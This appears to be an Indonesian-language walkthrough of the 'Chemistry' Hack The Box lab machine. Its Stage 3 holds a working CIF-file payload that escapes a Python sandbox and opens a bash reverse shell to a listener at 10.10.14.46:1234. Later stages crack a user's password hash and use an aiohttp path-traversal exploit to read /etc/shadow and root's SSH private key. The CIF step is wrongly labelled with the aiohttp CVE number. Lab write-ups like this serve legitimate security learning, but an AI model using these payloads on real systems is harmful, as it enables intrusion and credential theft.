## **Informasi Mesin**
- **Nama**: Chemistry
- **Sistem Operasi**: Linux
- **Tingkat Kesulitan**: easy
- **Alamat IP**: 10.10.11.38

## **Tahap 1: Enumerasi Awal**

### **Pemindaian Jaringan**

```bash
nmap -sT -p- --min-rate 10000 10.10.11.38
```

**Hasil Pemindaian:**

- **Port 5000**: HTTP Service
    

## **Tahap 2: Analisis Aplikasi Web**

### **Enumerasi Port 5000**

Akses ke port 5000 menampilkan aplikasi web dengan fitur registrasi dan upload file `.cif`.

### **File Upload Analysis**

Ditemukan file `example.cif` yang dapat di-download untuk mempelajari sintaks CIF (Crystallographic Information File).

## **Tahap 3: Eksploitasi CIF (CVE-2024-23334)**

### **CIF File Format**

CIF adalah format file yang digunakan dalam kristalografi untuk mendeskripsikan struktur atom kristal.

### **Payload Development**

Mengedit `example.cif` dengan menambahkan payload reverse shell:

```cif
_space_group_magn.transform_BNS_Pp_abc 'a,b,[d for d in ().__class__.__mro__[1].__getattribute__(
*[().__class__.__mro__[1]]+["sub" + "classes"]) () if d.__name__ == "BuiltinImporter"][0].load_module(
"os").system("/bin/bash -c 'sh -i >& /dev/tcp/10.10.14.46/1234 0>&1'");0,0,0'
```

### **Reverse Shell Execution**

1. **Setup Listener:**

```bash
nc -nlvp 1234
```

2. **Upload dan Execute:**
    
    - Upload file CIF yang dimodifikasi
    - Klik "View" untuk mengeksekusi payload
        

## **Tahap 4: Akses Awal dan Enumerasi**

### **Database Analysis**

Ditemukan file `database.db` yang berisi kredensial user.

### **Password Cracking**

Menggunakan CrackStation untuk mendekripsi hash password user Rosa.

### **User Flag**

```bash
cat /home/rosa/user.txt
```

User flag berhasil diperoleh.

## **Tahap 5: Enumerasi Privilege Escalation**

### **LinPEAS Enumeration**

Mengupload dan menjalankan LinPEAS untuk identifikasi vektor eskalsi:

```bash
./linpeas.sh
```

**Temuan:** Service internal berjalan pada port 8080.

### **SSH Port Forwarding**

```bash
ssh -L 8888:localhost:8080 rosa@10.10.11.38
```

## **Tahap 6: Eksploitasi aiohttp (CVE-2024-23334)**

### **Service Identification**

Nmap scan pada localhost mengidentifikasi aiohttp 3.9.1 berjalan pada port 8080.

### **Exploit Development**

Menggunakan GitHub POC untuk CVE-2024-23334 pada aiohttp.

### **File Read Exploitation**

#### **Verifikasi dengan /etc/passwd**
```bash
python3 exploit.py
```

Berhasil membaca `/etc/passwd`.

#### **Konfirmasi dengan /etc/shadow**
```bash
python3 exploit.py
```

Berhasil membaca `/etc/shadow` - konfirmasi akses root-level.

## **Tahap 7: Eskalasi ke Root**

### **Method 1: Direct Root Flag Read**

bash

```bash
# Modifikasi script untuk membaca /root/root.txt
python3 exploit.py
```

Root flag berhasil diperoleh.

### **Method 2: SSH Key Extraction**

```bash
# Modifikasi script untuk membaca /root/.ssh/id_rsa
python3 exploit.py
```

#### **SSH sebagai Root**

```bash
chmod 600 root_key
ssh -i root_key root@10.10.11.38
```

#### **Root Flag**

```bash
cat /root/root.txt
```

## **Kesimpulan**

Mesin Chemistry HTB mengdemonstrasikan:

1. **File Format Exploitation** - Kerentanan pada parser CIF
    
2. **Web Application Security** - Pentingnya input validation
    
3. **Lateral Movement** - Kombinasi multiple vulnerabilities
    
4. **Privilege Escalation** - Eksploitasi service internal
    

Pelajaran penting meliputi kebutuhan untuk:

- Secure file parsing implementation
    
- Proper service configuration dan isolation
    
- Regular vulnerability patching
    
- Defense in depth security strategy